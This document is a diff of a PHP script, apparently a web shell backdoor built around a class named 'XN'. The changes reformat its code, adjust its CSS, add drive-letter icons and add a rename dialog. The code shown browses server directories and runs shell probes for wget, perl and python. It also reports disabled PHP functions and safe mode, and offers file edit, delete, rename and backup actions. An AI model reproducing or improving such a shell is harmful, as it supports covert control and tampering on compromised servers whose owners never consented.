@@ -16,11 +16,7 @@ class XN
             $filename['name'] = getcwd() . XN::SLES() . $value;
             switch ($type) {
                 case 'dir':
-                    if (
-                        !is_dir($filename['name']) ||
-                        $value === '.' ||
-                        $value === '..'
-                    ) {
+                    if (!is_dir($filename['name']) ||$value === '.' ||$value === '..') {
                         continue 2;
                     }
                     break;
@@ -108,34 +104,13 @@ class XN
         }
         $info .= $perms & 0x0100 ? 'r' : '-';
         $info .= $perms & 0x0080 ? 'w' : '-';
-        $info .=
-            $perms & 0x0040
-                ? ($perms & 0x0800
-                    ? 's'
-                    : 'x')
-                : ($perms & 0x0800
-                    ? 'S'
-                    : '-');
+        $info .= $perms & 0x0040 ? ($perms & 0x0800? 's': 'x'): ($perms & 0x0800 ? 'S': '-');
         $info .= $perms & 0x0020 ? 'r' : '-';
         $info .= $perms & 0x0010 ? 'w' : '-';
-        $info .=
-            $perms & 0x0008
-                ? ($perms & 0x0400
-                    ? 's'
-                    : 'x')
-                : ($perms & 0x0400
-                    ? 'S'
-                    : '-');
+        $info .= $perms & 0x0008 ? ($perms & 0x0400? 's': 'x'): ($perms & 0x0400 ? 'S': '-');
         $info .= $perms & 0x0004 ? 'r' : '-';
         $info .= $perms & 0x0002 ? 'w' : '-';
-        $info .=
-            $perms & 0x0001
-                ? ($perms & 0x0200
-                    ? 't'
-                    : 'x')
-                : ($perms & 0x0200
-                    ? 'T'
-                    : '-');
+        $info .= $perms & 0x0001 ? ($perms & 0x0200 ? 't': 'x'): ($perms & 0x0200 ? 'T': '-');
         return $info;
     }
     public static function OS()
@@ -291,50 +266,22 @@ class XN
     }
     public static function lib_installed()
     {
-        $lib[] =
-            "MySQL: " .
-            (function_exists('mysql_connect')
-                ? self::color(1, 2, "ON")
-                : self::color(1, 1, "OFF"));
-        $lib[] =
-            "cURL:  " .
-            (function_exists('curl_version')
-                ? self::color(1, 2, "ON")
-                : self::color(1, 1, "OFF"));
-        $lib[] =
-            "Wget:  " .
-            (self::exe('wget --help')
-                ? self::color(1, 2, "ON")
-                : self::color(1, 1, "OFF"));
-        $lib[] =
-            "Perl:  " .
-            (self::exe('perl --help')
-                ? self::color(1, 2, "ON")
-                : self::color(1, 1, "OFF"));
-        $lib[] =
-            "Mail:  " .
-            (function_exists('mail')
-                ? self::color(1, 2, "ON")
-                : self::color(1, 1, "OFF"));
-        $lib[] =
-            "Python: " .
-            (self::exe('python --help')
-                ? self::color(1, 2, "ON")
-                : self::color(1, 1, "OFF"));
-        return implode(" | ", $lib);
+        $lib[]="MySQL: ".(function_exists('mysql_connect')?self::color(1,2,"ON"):self::color(1,1,"OFF"));
+        $lib[]="cURL:  ".(function_exists('curl_version')?self::color(1,2,"ON"):self::color(1,1,"OFF"));
+        $lib[]="Wget:  ".(self::exe('wget --help')?self::color(1,2,"ON"):self::color(1,1,"OFF"));
+        $lib[]="Perl:  ".(self::exe('perl --help')?self::color(1,2,"ON"):self::color(1,1,"OFF"));
+        $lib[]="Mail:  ".(function_exists('mail')?self::color(1,2,"ON"):self::color(1,1,"OFF"));
+        $lib[]="Python: ".(self::exe('python --help')?self::color(1,2,"ON"):self::color(1,1,"OFF"));
+        return implode(" | ",$lib);
     }
     public static function info($info = null)
     {
         switch ($info) {
             case 'disable_function':
-                return !empty(@ini_get("disable_functions"))
-                    ? @ini_get("disable_functions")
-                    : "NONE";
+                return !empty(@ini_get("disable_functions"))?@ini_get("disable_functions"):"NONE";
                 break;
             case 'mysql':
-                return function_exists('mysql_connect')
-                    ? "<font color=green>ON</font>"
-                    : "<font color=red>OFF</font>";
+                return function_exists('mysql_connect')?"<font color=green>ON</font>":"<font color=red>OFF</font>";
                 break;
             case 'ip':
                 return getHostByName(getHostName());
@@ -349,9 +296,7 @@ class XN
                 return phpversion();
                 break;
             case 'safe_mode':
-                return @ini_get(strtoupper("safe_mode")) === "ON"
-                    ? "ON"
-                    : "OFF";
+                return @ini_get(strtoupper("safe_mode"))==="ON"?"ON":"OFF";
                 break;
             case 'lib':
                 return self::lib_installed();
@@ -760,27 +705,48 @@ class XN
                 break;
         }
     }
-    public function disk($path)
-    {
-    	$array = "";
-    	$explode = explode('\\', $path);
-    	$explode = $explode[0];
-    	foreach (range("A", "Z") as $value) {
-    	 	$bool = $isdiskette  = in_array($value, array("A"));
-    	 	if (!$bool) $bool = is_dir("{$value}:\\");
-    	 	if ($bool) {
-    	 		$array .= "[ <a href='?x={$value}:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
-    	 		if ($array . ":" != $explode) {
-    	 			$array .= $value;
-    	 		} else {
-    	 			$array .= "<font color='green'>{$value}</font>";
-    	 		} $array .= "</a> ]";
-    	 	}
-    	 }
-    	 if (!empty($array)) {
-    	 	print("detected device : {$array}");
-    	 }
-    }
+    static public function disk($path) {
+	$letters = "";
+	$v = explode("\\", $path);
+	$v = $v[0];
+	 foreach(range("A", "Z") as $letter) {
+	  	$bool = $isdiskette = in_array($letter, array("A"));
+	  	if(!$bool) $bool = is_dir("{$letter}:\\");
+	  	if($bool) {
+	   		$letters .= "<a href='?x={$letter}:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
+	   		if($letter.":" != $v) {
+	   			$letters .= "<div class='diskk'>
+	   						 <div class='img'>
+	   						 <img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828703.svg'>
+	   						 </div>
+	   						 <div class='letter'>{$letter}</div> 
+	   						 </div>";
+	   		}
+	   		else {
+	   			$letters .= "<div class='usb'>
+	   						 <div class='img'>
+	   						 <img src='https://www.flaticon.com/svg/static/icons/svg/1828/1828650.svg'>
+	   						 </div>
+	   						 <div class='letter'>{$letter}</div> 
+	   						</div>";
+	   		}
+	   		$letters .= "</a>";
+	  	}
+	}
+	if(!empty($letters)) { ?>
+		<table class="disk" width="100%">
+			<tr>
+				<td>
+					Detected Drives
+				</td>
+				<td>:</td>
+				<td>
+					<?= $letters ?>
+				</td>
+			</tr>
+		</table>
+	<?php }
+}
     public static function countAllFiles($directory)
     {
         self::$array = [];
@@ -831,9 +797,7 @@ function head($x, $y, $class = null)
                     </button>
                 </li>
                 <li>
-                    <button onclick="location.href='?x=<?= $_SERVER[
-                        'DOCUMENT_ROOT'
-                    ] ?>'" type="button">
+                    <button onclick="location.href='?x=<?= $_SERVER['DOCUMENT_ROOT'] ?>'" type="button">
                         <div class="icon">
                             <a><i class="fas fa-reply-all"></i></a>
                         </div>
@@ -958,7 +922,7 @@ function head($x, $y, $class = null)
                         </div>
                     </button>
                 </li>
-                <input type="hidden" name="file" value="<?= $dir['name'] ?>">
+                <!-- <input type="hidden" name="file" value="<?= $dir['name'] ?>"> -->
             </form>
         </ul>
         <div class="mobile">
@@ -1108,7 +1072,7 @@ function alert($message)
         overflow: hidden;
         text-align: left;
         border-radius:10px;
-        max-height:98%;
+        max-height:98.5%;
         background: #fff;
         width:50%;
     }
@@ -1119,7 +1083,7 @@ function alert($message)
         padding-left:20px;
         padding-right: 20px;
         overflow-x: hidden;
-        max-height:75%;
+        max-height:73%;
 
     }
     .rewrite-success {
@@ -1209,6 +1173,7 @@ function alert($message)
         padding-top:10px;
         padding-bottom: 10px;
     }
+    .edit a,
     .rename button,
     .edit button {
         border-radius: 5px;
@@ -1279,6 +1244,53 @@ function alert($message)
         border-top-right-radius:5px;
         border-bottom-left-radius: 0px;
         border-bottom-right-radius:5px;
+    }
+    .disk {
+    	
+    }
+    .disk,
+    .pwdd {
+    	padding-bottom:10px;
+    	padding-top:10px;
+    }
+    .usb,
+    .diskk {
+    	width:6%;
+    	padding:5px;
+    	display: inline-block;
+    	margin-right:5px;
+    }
+    .usb .img,
+    .diskk .img {
+    	text-align: center;
+    	width:20px;
+    	height:20px;
+    	display: inline-block;
+    }
+    .usb .img img,
+    .diskk .img img {
+    	width:15px;
+    	margin:2.5px;
+    	height:15px;
+    }
+    .usb .letter,
+    .diskk .letter {
+    	margin:0px;
+    	position: absolute;
+    	display: inline-block;
+    }
+    table.disk {
+    	border-collapse: collapse;
+    	border-spacing:0;
+    }
+    table.disk td:first-child {
+    	width:130px;
+    }
+    table.disk td:nth-child(2) {
+    	width:10px;
+    	text-align: center;
+    }
+    table.disk td:nth-child(3) {
     }
     .hover {
         transition: all 0.35s;
@@ -1558,6 +1570,27 @@ function alert($message)
     .blocker.behind {
         background-color: transparent;
     }
+    .edit .modal-rename {
+        display: none;
+        vertical-align: middle;
+        position: relative;
+        z-index: 2;
+        max-width:500px;
+        box-sizing: border-box;
+        background: #fff;
+        -webkit-border-radius: 7px;
+        -moz-border-radius: 7px;
+        -o-border-radius: 7px;
+        -ms-border-radius: 7px;
+        border-radius: 7px;
+        box-shadow: 0 3px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+        text-align: left;
+    }
+    .edit .modal-rename input,
+    .edit .modal-rename button {
+        margin-bottom:3px;
+        width:100%;
+    }
     .modal-rename {
         display: none;
         vertical-align: middle;
@@ -1602,7 +1635,6 @@ function alert($message)
         border-radius: 7px;
     }
     .modal audio {
-
         outline: none;
         background: #fff;
     }
@@ -1666,7 +1698,11 @@ function alert($message)
             width:98%;
         }
         .table {
-            height:75.5%;
+            height:68%;
+        }
+        .modal {
+        	min-width:200px;
+        	max-width:500px;
         }
         .files {
             box-shadow: none;
@@ -1681,7 +1717,7 @@ function alert($message)
         }
         .block .date .dir-perms,
         .block .date .file-perms {
-            min-width:70px;
+            min-width:55px;
             display: inline-block;
         }
         .block .date .dir-time,
@@ -1690,18 +1726,25 @@ function alert($message)
         }
         .block .date .dir-owner,
         .block .date .file-owner {
-            min-width:70px;
+            min-width:55px;
             text-align: center;
             display: inline-block;
         }
         .back input[type=text] {
             width: 100%;
         }
+        .usb,
+    	.diskk {
+    		width:20%;
+    		padding:5px;
+    		display: inline-block;
+    		margin-right:5px;
+    	}
         .group {
             display: none;
         }
         .block .name {
-            max-width:200px;
+            max-width:170px;
             overflow: hidden;
             white-space: nowrap;
             text-overflow: ellipsis;
@@ -2202,12 +2245,10 @@ function filterTable() {
                             <td colspan="3">
                                 <button disabled>Edit</button>
                                 <button name="action" value="delete">Delete</button>
-                                <button name="action" value="rename">Rename</button>
+                                <a href="#rename<?= XN::replace($_POST['file']) ?>" rel="modal:open">Rename</a>
                                 <button name="action" value="backup">Backup</button>
                             </td>
-                            <input type="hidden" name="file" value="<?= $_POST[
-                                'file'
-                            ] ?>">
+                            <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
                         </form>
                     </tr>
                     <form method="post">
@@ -2225,6 +2266,20 @@ function filterTable() {
                                 <input type="hidden" name="action" value="edit">
                             </td>
                         </tr>
+                        <div id="rename<?= XN::replace($_POST['file']) ?>" class="modal modal-rename">
+                        <div class="rename">
+                            <h2>Rename</h2>
+                            <form method="post" action="?x=<?= getcwd() ?>">
+                                <div>
+                                    <input type="text" name="newname" value="<?= $_POST['file'] ?>">
+                                </div>
+                                <div>
+                                    <button name="action" value="rename">Rename</button>
+                                </div>
+                                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+                            </form>
+                        </div>
+                    </div>
                     </form>
                 </table>
             </div>
